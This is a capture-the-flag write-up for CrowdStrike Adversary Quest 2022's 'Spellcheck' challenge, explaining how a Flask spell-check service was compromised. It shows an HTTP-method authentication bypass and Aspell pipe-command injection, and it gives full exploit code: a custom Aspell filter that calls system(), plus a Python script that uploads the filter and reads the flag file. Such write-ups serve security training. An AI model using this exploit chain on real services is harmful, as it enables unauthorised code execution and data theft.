# Crowdstrike Adversary Quest 2022 / Tabloid Jackal / #2 Spellcheck

## Challenge Description

Initial response handling of the “Daily Code” incident has turned the spotlight on a web service that was apparently exploited by TABLOID JACKAL to gain initial access to a certain laptop. This web service was believed to run locally on the laptop of the managing editor of “Daily Code”, but a quick scan of the network revealed that it was exposed to the whole internal network. Please analyze the web service - reachable at 116.202.161.100:5000 for the purpose of analysis - and help us to identify the vulnerability.

Hint:
The challenge is running on Ubuntu 22.04.

## TL;DR Summary

- This spell checking web service allows administrators to upload dictionaries to be used for spell checking.
- The upload function has an authentication bypass vulnerability that can be exploited to upload files.
- The way that input text is fed into the spell checking backend program Aspell allows delivery for special Aspell commands.
- Using these commands, one can read and set configuration options.
- Abusing this, an attacker can upload a custom Aspell filter (mode) to gain remote code execution.

## Pre-Requisites

Later needed for compiling aspell

```txt
sudo apt install perl
sudo apt install libtool
sudo apt install gettext
sudo apt install autoconf
sudo apt install automake
```

## Web Service Reconnaissance

The challenge provided a .tar.gz archive of the spell checking web service `spellcheck.py`, which is a python flask web service with the following endpoints:

| Endpoint | Functionality |
| --- | --- |
| `/status` | Returns some environment values |
| `/dicts` | Lists Aspell dictionaries in subdir `./dicts` |
| `/spellcheck` | Apply server-side Aspell (`aspell pipe -d`) via `subprocess.check_output()` with HTTP POST paramters `lang` and `text` |
| `/dicts/update` | Allows uploading of new aspell dictionary files. If using HTTP method POST, the ADMIN_PASSWORD is checked. |

Let's do some initial probing of above endpoints via curl. We're also firing up Burpsuite as an Interception Proxy to route our traffic through to be able to further inspect and/or tamper with it (TCP port 8080 on localhost).

### Endpoint /status

```console
$ curl http://116.202.161.100:5000/status --proxy "http://127.0.0.1:8080"                       
{"cwd":"/home/challenge/challenge","engine":"@(#) International Ispell Version 3.1.20 (but really Aspell 0.60.8)","platform":"Linux"}
```

So Aspell version 0.60.8 seems to be used on a Linux platform. The additional challenge hint reads that Ubuntu 22.04 is being used.

### Endpoint /dicts

```console
$ curl http://116.202.161.100:5000/dicts --proxy "http://127.0.0.1:8080"
{"dicts":["en.multi","en-wo_accents-only.rws","en-wo_accents.multi","en-common.rws"]}
```

The **dicts** subdirectory seems to only contain English dictionary files.

### Endpoint /dicts/update

If we are to use the HTTP method POST, we would need to supply the correct ADMIN_PASSWORD via parameter **password**. But we don't know this.

We could bypass the password check by using a different HTTP method. Let's try to upload a new (fake) dictionary file via HTTP GET.

```console
$ echo bla > blub.txt
$ curl http://116.202.161.100:5000/dicts/update -X GET -F "dict=@blub.txt" --proxy "http://127.0.0.1:8080"
{"status":"ok"}
```

Status **ok** sounds good. Let's verify with **/dicts**.

```console
$ curl http://116.202.161.100:5000/dicts --proxy "http://127.0.0.1:8080"
{"dicts":["en.multi","en-wo_accents-only.rws","en-wo_accents.multi","blub.txt","en-common.rws"]}
```

Perfect! We have verified that we can upload files via endpoint **/dicts/update** using the HTTP method GET.

### Endpoint /spellcheck

Let's take a closer look at how this endpoint works.

```python
def aspell(*args, **kwargs):
    args = ["aspell", "--dict-dir", DICTS_DIR] + list(args)
    return check_output(args, **kwargs).strip().decode()


@app.route("/spellcheck", methods=["POST"])
def spellcheck_raw():
    lang = secure_filename(request.form.get("lang", "en"))
    text = request.form.get("text", "").encode()
    results = aspell("pipe", "-d", lang, input=text).splitlines()[1:]
    return jsonify({"results": results})
```

We have to use the HTTP method POST and supply the parameters **lang** and **text**. Default value for **lang** is **en**.

While the parameter **lang** is sanitized via Werkzeug's function **secure_filename()**, parameter **text** is not.

The value from parameter **text** is directly fed into STDIN of the subprocess for invoking Aspell.

The invocation would look like `aspell --dict-dir /home/challenge/challenge/dicts pipe -d $lang` with **$lang** supplied by us.

What does Aspell **pipe** mean? Let's check the documentation:

```txt
command `pipe`: `-a|pipe          "ispell -a" compatibility mode`
```

What is this compatibility mode?

```txt
ispell -a mode from ispell manpage:

The -a option is intended to be used from other programs through a pipe. In this mode, ispell prints a one-line version identification message, and then begins reading lines of input. For each input line, a single line is written to the standard output for each word checked for spelling on the line. If the word was found in the main dictionary, or your personal dictionary, then the line contains only a '*'. If the word was found through affix removal, then the line contains a '+', a space, and the root word. If the word was found through compound formation (concatenation of two words, controlled by the -C option), then the line contains only a '-'. 

Read more at: https://www.commandlinux.com/man-page/man1/ispell.1.html
```

Good to know... let's try to execute a spell checking of the word **blarb**.

```console
$ curl http://116.202.161.100:5000/spellcheck --proxy "http://127.0.0.1:8080" -d "lang=en&text=blarb"
{"results":["& blarb 17 0: blab, barb, blurb, blare, blob, bulb, Blair, blabs, blear, Lab, lab, blurbs, blabber, blah, blur, blab's, blurb's"]}
```

## Analysis and Initial Approach Development

Recap:

- We know that the web service's current working directory is `/home/challenge/challenge/`.
- We can upload files to subdirectory **/dicts**, likely being `/home/challenge/challenge/dicts/`.
- We can initiate spell checking, having control over language selection (**lang**) and text input (**text**).
- We know Aspell runs on a Linux box, version 0.60.8, in `ispell -a compatibility mode`.

Let's read up more about this compatibility mode.

### ispell -a compatibility mode

Links

- <https://www.commandlinux.com/man-page/man1/ispell.1.html>
- <http://aspell.net/man-html/Through-A-Pipe.html#Through-A-Pipe>

```txt
In addition to the above commands which are designed for Ispell compatibility Aspell also supports its own extensions. All Aspell extensions follow the following format.

$$command [data]
Where data may or may not be required depending on the particular command. Aspell currently supports the following commands:

cs option,value	Change a configuration option.
cr option	Prints the value of a configuration option.
pp	Returns a list of all words in the current personal wordlist.
ps	Returns a list of all words in the current session dictionary.
l	Returns the current language name.
ra mis,cor	Add the word pair to the replacement dictionary for later use. Returns nothing.
Anything returned is returned on its own line. All lists returned have the following format

num of items: item1, item2, etc
```

Now that sounds interesting. Maybe we are able to issue/abuse these Aspell extension commands.

```console
$ curl http://116.202.161.100:5000/spellcheck --proxy "http://127.0.0.1:8080" -d 'lang=en&text=$$l'
{"results":["en"]}
```

What about reading configuration values via **$$cr**? The possible configuration option names can be queried via [aspell dump config](./aspell-dump-config.txt).

- $$cr conf-dir returns `/etc/`
- $$cr data-dir returns `/usr/lib/aspell`
- $$cr dict-dir returns `/home/challenge/challenge/dicts`
- $$cr mode returns `nroff`
- $$cr home-dir returns `/home/challenge`
- $$cr per-conf returns `.aspell.conf` (personal configuration file)
- $$cr personal returns `.aspell.en.pws`
- $$cr use-other-dicts returns `true` (= use personal, replacement & session dictionaries)
- $$cr warn returns `true` (= enable warnings)

### Further Approach Development

Going through the list of possible configuration options to read (and eventually set/change), these two stand out combined with our ability to upload files:

```txt
# filter (list)
#   add or removes a filter

# filter-path (list)
#   path(s) aspell looks for filters
```

What if we could create a custom Aspell filter (mode), upload and activate that?

Let's start with taking a look at what actually happens if we locally try to activate a (custom) Aspell filter (mode) for a filter in a custom filter path?

```console
$ strace aspell pipe
[...]
```

Entering the commands...

- `$$cs add-filter-path,/home/challenge/challenge/dicts/`
- `$$cs add-filter,blub`
- `+blub`

...yield the [strace log](./aspell-strace-load-custom-filter.txt).

Summary:

- Aspell searches /usr/lib/aspell/x86_64-linux-gnu/ for **blub.amf**
- Aspell searches /home/challenge/challenge/dicts/ for **blub.amf**.
- Aspell is then looking for `blub-filter.info` and `blub-filter.so`.

This sounds awesome! We seem to be on the right track!

## Building a Custom Aspell Filter (Mode)

Let's grab the Aspell source code to investigate into building our own custom filter.

```console
$ cd /usr/src
# sudo git clone https://github.com/gnuaspell/aspell
```

Make some copy/paste changes to the [Makefile](./aspell-source-changes/Makefile.am.gitdiff) to include a new filter named **blub**.

Taking a look at the other built-in filters, a custom filter needs to extend the class **IndividualFilter**. We need to implement the methods **setup()**, **reset()** and **process()**.

Let's try something basic first, executing the touch command via **system()** in the setup function, leaving reset and process empty.

```cpp
  PosibErr<bool> BlubFilter::setup(Config * opts) 
  {
    name_ = "blub-filter";
    system("touch /tmp/blub_was_here");    
    reset();
    return true;
  }
```

Now we compile Aspell with the new custom blub filter. 

```console
$ ./autogen
$ ./configure --disable-static
$ make
```

### Testing against local Aspell

Copy the resulting files **blub.amf**, **blub-filter.info** and **blub-filter.so** to `/home/challenge/challenge/dicts/`.

Invoke aspell again, enter

```txt
$$cs add-filter-path,.
$$cs add-filter,blub
+blub
```

Did **system()** execute and create the file **blub_was_here** in **/tmp**?

```console
$ ls -l /tmp                                           
total 56
-rw-r--r-- 1 kali kali    0 Jul 15 19:33 blub_was_here
```

Yay! Now we are on the finishing line!

### Final Payload for Custom Filter

One nice way to gain access to the target machine would be to open a reverse shell to a machine we have control over (e.g. running a netcat listener).

Lacking such a server with a public IPv4 address, we may as well try to leak the flag into the dicts subdirectory and read it from there via endpoint **/dicts** listing.

Rebuilding the custom filter with the payload and recompiling it will yield the final exploit.

```cpp
system("/usr/bin/touch /home/challenge/challenge/dicts/`/usr/bin/cat /home/challenge/challenge/flag.txt | /usr/bin/base64 | /usr/bin/rev`");\
```

### Python Implementation

Now we just glue all the puzzle pieces together with a nice python script to automate uploading the custom filter files, activating it via spell checking and grabbing the flag from the dicts directory.

```python
TO_UPLOAD = ["blub.amf", "blub-filter.info", "blub-filter.so"]
HEADERS = {"Content-Type": "application/x-www-form-urlencoded"}
SERVER = "http://116.202.161.100:5000"

for file in TO_UPLOAD:
  requests.get('http://116.202.161.100:5000/dicts/update', files={'dict': (file, open("aspell-attack-filter/" + file, 'rb'))})

requests.post(SERVER + "/spellcheck", data='text=$$cs+add-filter-path,/home/challenge/challenge/dicts/%0a$$cs+add-filter,blub%0a%2bblub', headers=HEADERS)

resp = requests.get(SERVER + "/dicts")
dicts_json = json.loads(resp.text)
encoded_flag = dicts_json["dicts"][-1][::-1] # [-1] -> last file, [::-1] -> reverse characters
flag = b64decode(encoded_flag).decode().strip()
```

See [pwn_spellcheck.py](./pwn_spellcheck.py) for automated solution script.

## Now it's Flag Time!

```console
$ ./pwn_spellcheck.py
Flag = CS{sp3llch3ck_pwn4g3}
```

Flag: **CS{sp3llch3ck_pwn4g3}**

